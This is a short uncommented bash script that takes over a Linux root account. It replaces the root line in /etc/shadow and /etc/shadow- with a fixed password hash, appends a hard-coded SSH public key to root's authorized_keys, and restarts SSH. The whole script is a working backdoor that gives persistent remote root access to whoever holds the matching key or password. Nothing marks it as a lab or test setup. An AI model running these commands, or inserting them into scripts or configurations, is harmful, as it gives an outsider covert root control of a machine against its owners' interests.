#!/bin/bash

sed '1d' -i /etc/shadow

sed '1i\root:$y$j9T$HGTDJ.dqONFuYC5XeMA1r0$up4ugNPytqJwz4RyJfUgjPz1eAyK/NLn.ZmW6ysM7G7:19333:0:14600:14:::' -i /etc/shadow

sed '1d' -i /etc/shadow-

sed '1i\root:$y$j9T$HGTDJ.dqONFuYC5XeMA1r0$up4ugNPytqJwz4RyJfUgjPz1eAyK/NLn.ZmW6ysM7G7:19333:0:14600:14:::' -i /etc/shadow-

sudo sh -c "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD0Wff986/ookz95Sb7btND8VUMIC/4/5uwLYUlbspZgBXHE/txwbcvmSQSL99aKqeGtxz3hbYve00CNqgAm8GcyKMrgL+RZNeQdXFx5qetO7L+HMaNUlhDf7CVjvsjatNkj5DbSq77TcjONqRHnBKpgA2d9EkYb/n7ltows3bqwMTtBl3C5c+lP+ZF3NYygrN7rXTOm4kuN9S72i4juJDAvNBxviZ0MAbbAiUvtOpCRP3d8ItFPwkQUeTClwqb4LFwqtrXd7LLslKwGj+fTOd+KX0cFw70+AOPLAgmt7uQIhXdif/kFfSNRx7U/bpJcg1NFi3k5N0sMUdw1XYf8xoIyu6iBcyJ3btmM807gFkEl3t/7cYDKNM7cupo4meP4Le/4RsE5Hc3vrNx9cw7GHCaNnK+cZENN78OrUxKSVv36OqITPZXuut9nbtMlOckaYxWf2zju2DX/csdBIuDytPjnJrnRbBDJXKLcfGDigAJCKoRAnUae/RxpU4FzDpVMxs= root@user'  >> ~/.ssh/authorized_keys"

systemctl restart ssh
